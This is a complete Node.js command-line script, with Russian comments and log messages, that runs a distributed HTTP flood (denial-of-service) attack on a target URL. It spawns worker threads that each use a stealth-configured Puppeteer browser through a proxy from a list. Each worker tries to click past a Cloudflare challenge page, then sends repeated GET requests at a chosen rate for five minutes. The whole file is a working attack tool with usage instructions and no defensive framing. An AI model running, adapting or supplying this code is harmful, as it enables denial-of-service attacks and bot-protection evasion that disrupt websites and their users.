const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const fs = require('fs');
const { Worker, isMainThread, workerData } = require('worker_threads');

// Инициализация плагина
puppeteer.use(StealthPlugin());

// Конфигурация
const config = {
    chromePath: '/usr/bin/google-chrome',
    userAgents: [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
    ],
    timeout: 30000
};

async function runWorker({ targetUrl, proxy, rate }) {
    console.log(`[+] Запуск worker для ${targetUrl} через ${proxy}`);
    
    let browser;
    try {
        // Конфигурация браузера
        const launchOptions = {
            headless: false,
            args: [
                `--proxy-server=${proxy}`,
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--ignore-certificate-errors'
            ],
            ignoreHTTPSErrors: true
        };

        // Добавляем путь к Chrome, если существует
        if (fs.existsSync(config.chromePath)) {
            launchOptions.executablePath = config.chromePath;
        }

        browser = await puppeteer.launch(launchOptions);
        const page = await browser.newPage();

        // Настройка User-Agent и заголовков
        const userAgent = config.userAgents[Math.floor(Math.random() * config.userAgents.length)];
        await page.setUserAgent(userAgent);
        await page.setExtraHTTPHeaders({
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        });

        // Включение логирования
        page.on('console', msg => console.log('PAGE LOG:', msg.text()));
        page.on('response', response => {
            if(response.status() >= 400) {
                console.log(`[!] HTTP ${response.status()} от ${response.url()}`);
            }
        });
        page.on('pageerror', error => console.log(`[!] Page Error: ${error.message}`));

        console.log(`[→] Перехожу на ${targetUrl}`);
        await page.goto(targetUrl, {
            waitUntil: 'networkidle2',
            timeout: config.timeout
        });

        // Проверка на наличие Cloudflare Challenge
        const title = await page.title();
        if (title.includes('Just a moment') || title.includes('DDoS protection')) {
            console.log('[!] Обнаружена защита Cloudflare');
            await handleCloudflare(page);
        }

        console.log('[✓] Успешное подключение. Начинаем флуд...');
        startFlood(targetUrl, proxy, rate, userAgent);

    } catch (error) {
        console.error(`[×] Ошибка: ${error.message}`);
        if (browser) await browser.close();
    }
}

async function handleCloudflare(page) {
    try {
        console.log('[→] Пытаемся обойти защиту...');
        
        // Ждем появления challenge формы
        await page.waitForSelector('#challenge-form', { timeout: 10000 });
        
        // Эмулируем человеческое поведение
        await page.mouse.move(100, 100);
        await page.mouse.click(100, 100);
        await page.waitForTimeout(2000 + Math.random() * 3000);
        
        // Отправляем форму
        await page.click('#challenge-form input[type="submit"]');
        await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 });
        
        console.log('[✓] Защита успешно пройдена');
        return true;
    } catch (error) {
        console.error(`[×] Не удалось обойти защиту: ${error.message}`);
        return false;
    }
}

function startFlood(targetUrl, proxy, rate, userAgent) {
    const [proxyHost, proxyPort] = proxy.split(':');
    const proxyConfig = {
        host: proxyHost,
        port: parseInt(proxyPort)
    };

    console.log(`[⚡] Запуск флуда с частотой ${rate} запр/сек`);
    
    const interval = setInterval(() => {
        axios.get(targetUrl, {
            proxy: proxyConfig,
            headers: { 
                'User-Agent': userAgent,
                'Cache-Control': 'no-cache'
            },
            timeout: 5000
        })
        .then(() => process.stdout.write('.'))
        .catch(() => process.stdout.write('x'));
    }, 1000 / rate);

    // Остановка через 5 минут
    setTimeout(() => {
        clearInterval(interval);
        console.log('\n[!] Флуд завершен (таймаут)');
    }, 300000);
}

// Главный поток
if (isMainThread) {
    if (process.argv.length < 6) {
        console.log('Использование: node script.js <URL> <потоки> <прокси-файл> <частота>');
        process.exit(1);
    }

    const targetUrl = process.argv[2];
    const threads = parseInt(process.argv[3]);
    const proxyFile = process.argv[4];
    const rate = parseInt(process.argv[5]);

    if (!fs.existsSync(proxyFile)) {
        console.error(`Файл прокси ${proxyFile} не найден!`);
        process.exit(1);
    }

    const proxies = fs.readFileSync(proxyFile, 'utf-8')
        .split('\n')
        .filter(p => p.trim().length > 0);

    console.log(`[•] Запуск ${threads} потоков на ${targetUrl}`);
    
    for (let i = 0; i < threads; i++) {
        new Worker(__filename, {
            workerData: {
                targetUrl,
                proxy: proxies[i % proxies.length],
                rate
            }
        });
    }
} else {
    runWorker(workerData).catch(console.error);
}
